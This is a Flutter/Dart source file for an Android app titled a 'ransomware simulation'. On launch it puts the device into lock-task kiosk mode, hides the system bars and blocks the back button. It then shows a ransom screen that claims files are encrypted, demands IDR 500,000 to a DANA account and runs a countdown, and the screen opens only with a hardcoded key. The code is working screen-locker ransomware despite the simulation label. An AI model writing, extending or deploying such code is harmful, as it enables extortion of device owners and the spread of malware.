import 'dart:async';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';

void main() {
  runApp(const RansomwareSimulasiApp());
}

// Root widget for the security simulation application
class RansomwareSimulasiApp extends StatelessWidget {
  const RansomwareSimulasiApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'Ransomware Simulation',
      theme: ThemeData.dark(),
      home: const LockScreenPage(),
    );
  }
}

// Lock Screen Simulation (Main Page)
class LockScreenPage extends StatefulWidget {
  const LockScreenPage({super.key});

  @override
  State<LockScreenPage> createState() => _LockScreenPageState();
}

class _LockScreenPageState extends State<LockScreenPage>
    with WidgetsBindingObserver {
  // CONTROLLER & STATE CONFIGURATION
  final TextEditingController _passController = TextEditingController();
  final FocusNode _passwordFocusNode = FocusNode();

  // Correct password to unlock the simulation
  final String correctPassword = "hacker123";

  // Time countdown (10 minutes / 600 seconds)
  int _startSeconds = 600;
  late Timer _timer;

  // Method Channel for communication with Kotlin Native (Lock Task / Kiosk Mode)
  static const platform = MethodChannel('com.simulasi.lockscreen/lock');

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);

    // Hide the system status bar & navigation bar
    SystemChrome.setEnabledSystemUIMode(SystemUiMode.immersiveSticky);

    // Add a 1.5-second delay after reboot to ensure the Android system is ready to accept lock task & keyboard
    Future.delayed(const Duration(milliseconds: 1500), () {
      _enableLockTask();
      _passwordFocusNode.requestFocus();
      SystemChannels.textInput.invokeMethod('TextInput.show');
    });

    _startTimer();
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    _timer.cancel();
    _passController.dispose();
    _passwordFocusNode.dispose();

    // Restore the system UI to normal upon exit
    SystemChrome.setEnabledSystemUIMode(SystemUiMode.edgeToEdge);
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    super.didChangeAppLifecycleState(state);
    // Maintain immersive mode if the application regains focus
    if (state == AppLifecycleState.resumed) {
      SystemChrome.setEnabledSystemUIMode(SystemUiMode.immersiveSticky);
    }
  }

  // NATIVE INTERACTION FUNCTIONS (METHOD CHANNEL)
  Future<void> _enableLockTask() async {
    try {
      await platform.invokeMethod('startLockTask');
    } on PlatformException catch (e) {
      debugPrint("Failed to activate Lock Task: '${e.message}'");
    }
  }

  Future<void> _disableLockTask() async {
    try {
      await platform.invokeMethod('stopLockTask');
    } on PlatformException catch (e) {
      debugPrint("Failed to disable Lock Task: '${e.message}'");
    }
  }

  // TIME LOGIC (TIMER)
  void _startTimer() {
    _timer = Timer.periodic(const Duration(seconds: 1), (timer) {
      if (_startSeconds > 0) {
        setState(() {
          _startSeconds--;
        });
      } else {
        timer.cancel();
      }
    });
  }

  String get _formattedTime {
    int minutes = _startSeconds ~/ 60;
    int seconds = _startSeconds % 60;
    return '${minutes.toString().padLeft(2, '0')}:${seconds.toString().padLeft(2, '0')}';
  }

  // PASSWORD VERIFICATION LOGIC
  void _verifyPassword() async {
    if (_passController.text == correctPassword) {
      _timer.cancel();

      // Disable the system lock and restore the UI
      await _disableLockTask();
      SystemChrome.setEnabledSystemUIMode(SystemUiMode.edgeToEdge);

      if (!mounted) return;
      _showSuccessDialog();
    } else {
      _showErrorSnackBar();
    }
  }

  void _showSuccessDialog() {
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) => AlertDialog(
        title: const Text("Access Restored"),
        content: const Text(
          "Decryption key verified. System control returned to user.",
        ),
        actions: [
          TextButton(
            onPressed: () {
              Navigator.of(context).pop();
              SystemNavigator.pop();
            },
            child: const Text("DISCONNECT"),
          ),
        ],
      ),
    );
  }

  void _showErrorSnackBar() {
    ScaffoldMessenger.of(context).showSnackBar(
      const SnackBar(
        content: Text(
          "ACCESS DENIED: Invalid key. Termination sequence continues.",
        ),
        backgroundColor: Colors.red,
      ),
    );
  }

  void _checkPayment() {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        title: const Text("Transaction Verification"),
        content: const Text(
          "Error: No incoming transaction detected in the destination bank account. Complete the transfer to proceed.",
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.of(context).pop(),
            child: const Text("ACKNOWLEDGE"),
          ),
        ],
      ),
    );
  }

  // USER INTERFACE (UI)
  @override
  Widget build(BuildContext context) {
    return PopScope(
      canPop: false, // Blocking the physical Back button
      child: Scaffold(
        backgroundColor: Colors.black,
        body: Center(
          child: SingleChildScrollView(
            padding: const EdgeInsets.all(24.0),
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                _buildHeaderIcon(),
                const SizedBox(height: 20),
                _buildWarningTitle(),
                const SizedBox(height: 15),
                _buildRansomMessage(),
                const SizedBox(height: 25),
                _buildTimerContainer(),
                const SizedBox(height: 30),
                _buildPasswordField(),
                const SizedBox(height: 10),
                _buildSubmitButton(),
                const SizedBox(height: 10),
                _buildPaymentButton(),
              ],
            ),
          ),
        ),
      ),
    );
  }

  Widget _buildHeaderIcon() {
    return const Icon(Icons.warning_amber_rounded, color: Colors.red, size: 80);
  }

  Widget _buildWarningTitle() {
    return const Text(
      "YOUR SYSTEM HAS BEEN LOCKED",
      style: TextStyle(
        color: Colors.red,
        fontSize: 22,
        fontWeight: FontWeight.bold,
        letterSpacing: 1.5,
      ),
      textAlign: TextAlign.center,
    );
  }

  Widget _buildRansomMessage() {
    return const Text(
      "All critical files on this device have been encrypted.\n\n"
      "Do not attempt to restart or bypass this screen, or your data will be permanently lost.\n\n"
      "Payment Required: IDR 500,000\n"
      "DANA Account: 081234567890",
      style: TextStyle(color: Colors.white70, fontSize: 13),
      textAlign: TextAlign.center,
    );
  }

  Widget _buildTimerContainer() {
    return Container(
      padding: const EdgeInsets.symmetric(vertical: 10, horizontal: 20),
      decoration: BoxDecoration(
        border: Border.all(color: Colors.red),
        color: Colors.red.withOpacity(0.1),
      ),
      child: Text(
        "Remaining time: $_formattedTime",
        style: const TextStyle(
          color: Colors.redAccent,
          fontSize: 18,
          fontWeight: FontWeight.bold,
        ),
      ),
    );
  }

  Widget _buildPasswordField() {
    return TextField(
      controller: _passController,
      focusNode: _passwordFocusNode,
      obscureText: true,
      onTap: () {
        _passwordFocusNode.requestFocus();
        SystemChannels.textInput.invokeMethod('TextInput.show');
      },
      style: const TextStyle(color: Colors.white),
      decoration: const InputDecoration(
        labelText: "Enter Key",
        labelStyle: TextStyle(color: Colors.grey),
        enabledBorder: OutlineInputBorder(
          borderSide: BorderSide(color: Colors.grey),
        ),
        focusedBorder: OutlineInputBorder(
          borderSide: BorderSide(color: Colors.red),
        ),
      ),
    );
  }

  Widget _buildSubmitButton() {
    return SizedBox(
      width: double.infinity,
      height: 45,
      child: ElevatedButton(
        style: ElevatedButton.styleFrom(
          backgroundColor: Colors.red[900],
          foregroundColor: Colors.white,
        ),
        onPressed: _verifyPassword,
        child: const Text("UNLOCK"),
      ),
    );
  }

  Widget _buildPaymentButton() {
    return SizedBox(
      width: double.infinity,
      height: 45,
      child: OutlinedButton(
        style: OutlinedButton.styleFrom(
          side: const BorderSide(color: Colors.white54),
          foregroundColor: Colors.white,
        ),
        onPressed: _checkPayment,
        child: const Text("Verify Payment Status"),
      ),
    );
  }
}
